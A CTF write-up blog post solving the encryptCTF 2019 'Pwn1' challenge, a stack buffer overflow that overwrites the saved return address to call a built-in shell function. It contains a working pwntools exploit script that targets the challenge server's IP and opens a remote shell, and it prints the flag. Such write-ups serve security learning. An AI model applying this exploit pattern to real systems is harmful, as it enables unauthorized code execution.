---
layout: single
title: encryptCTF 2019 Pwn Write-up 2 of 5
excerpt: Second part of my encryptCTF 2019 Pwn write-up series. This challenge tackles basic stack buffer overflow — overwriting saved return address to control the program flow.
date: '2019-04-04T08:06:21.960Z'
classes: wide
categories:
- ctf
- encryptctf
tags:
- pwn
---

| ![First pwn board wipe of the year. hsb represent! ](https://cdn-images-1.medium.com/max/800/1*ycEO30rNNBaEmC9qIWf8VQ.png) |
|:--:|
| First pwn board wipe of the year. hsb represent!  |

### Pwn1 Solution (50 pts.)

> This challenge tackles basic stack buffer overflow — overwriting saved return address to control the program flow.

Challenge description:

> Let’s do some real stack buffer overflow.

Let’s examine the binary.

![Commands used: `file` and `gdb` `checksec`](https://cdn-images-1.medium.com/max/800/1*28DBoAQpH1zjYZHsoLTpgA.png)

Commands used: `file` and `gdb` `checksec`

Upon checking, we can see that the file is a `32-bit ELF executable,` and `Canary`, `PIE` and `RelRo` are disabled. Hence, we can try to do a `buffer overflow` to overwrite the saved return address.

Let’s try to run the binary.

![](https://cdn-images-1.medium.com/max/800/1*7_QNApZ657vA0THch0wtSQ.png)

The program asks for a user input. Let’s enter a long string and check if we can control the program flow. We can use `msf-pattern_create.rb` to generate a long unique pattern.

![msf-pattern_create.rb is a script from metasploit-framework](https://cdn-images-1.medium.com/max/800/1*EvF5avd7k9j72cdyyxnz6g.png)

Let’s use the generated string as our input.

![oooohhhh, segmentation fault ](https://cdn-images-1.medium.com/max/800/1*O5Kf8Y0MgadJeLOk-S_i_g.png)

Segmentation fault! It seems that we have overwritten the saved return address with `0x37654136`. Let’s use `msf-pattern_offset.rb` to compute the offset.

![offset @ 140](https://cdn-images-1.medium.com/max/800/1*hQeGrPsqkWlZpn6GGSayQw.png)

With these info, we can test a sample payload to confirm if we can control the instruction pointer.

```
payload = [140 bytes buffer] + "BBBB"   
payload = "A"*140 + "B"*4
```

![Aha! We have overwritten the return address with `BBBB`](https://cdn-images-1.medium.com/max/800/1*_VMZhK8uH7lHgK3b-PJA6g.png)

We have successfully overwritten the return address! Now, let’s look for functions that can be used to exploit the program.

Let’s fire up `radare2` and look for functions.

![shell() — hmmmmmmm??](https://cdn-images-1.medium.com/max/800/1*koSM5LovUW2HZEUMgmp6uw.png)

Upon checking the functions, there is a `WIN` function. This shell() function (`0x080484ad`) works like this —

```
shell() = system('/bin/bash')
```

Since we already have a control on the program flow, we can force to execute the shell function after the execution of the main function.

Let’s use our previous payload template and replace `BBBB` with `0x080484ad`.

```
payload = [140 bytes buffer] + [address]  
prev_payload = "A"*140 + "B"*4  
new_payload = "A"*140 + 0x080484ad
```

Let’s try to send this payload with this script.

```
./exploit.py

from pwn import *

r = remote('104.154.106.182', 2345)

shell_addr = 0x080484ad  
offset = 140

payload = ""  
payload += "A"*140  
payload += p32(shell_addr)

r.recvuntil('name:')

log.info('Payload format: [140 bytes buffer] + 0x80484ad')  
log.info('Sending payload...')  
log.info('Overwriting return address with {}'.format(hex(shell_addr)))  
r.sendline(payload)  
r.recvline()

log.info('Enjoy your shell! ')  
r.interactive()
```

Running the script will give us a beautiful shell.

![shell!](https://cdn-images-1.medium.com/max/800/1*9BRbl9vVc1gA8yjy7gy3Xg.png)

The exploit worked! And we got the flag 

Flag: `encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}`

-

— ar33zy

[hackstreetboys](https://hackstreetboys.ph/) aka [hsb] is a CTF team from the Philippines.

Please do like our [Facebook Page](https://www.facebook.com/hackstreetboys/) and Follow us on [Twitter](https://twitter.com/_hackstreetboys), [Medium](https://medium.com/hackstreetboys), and [GitHub](https://github.com/hackstreetboysph).
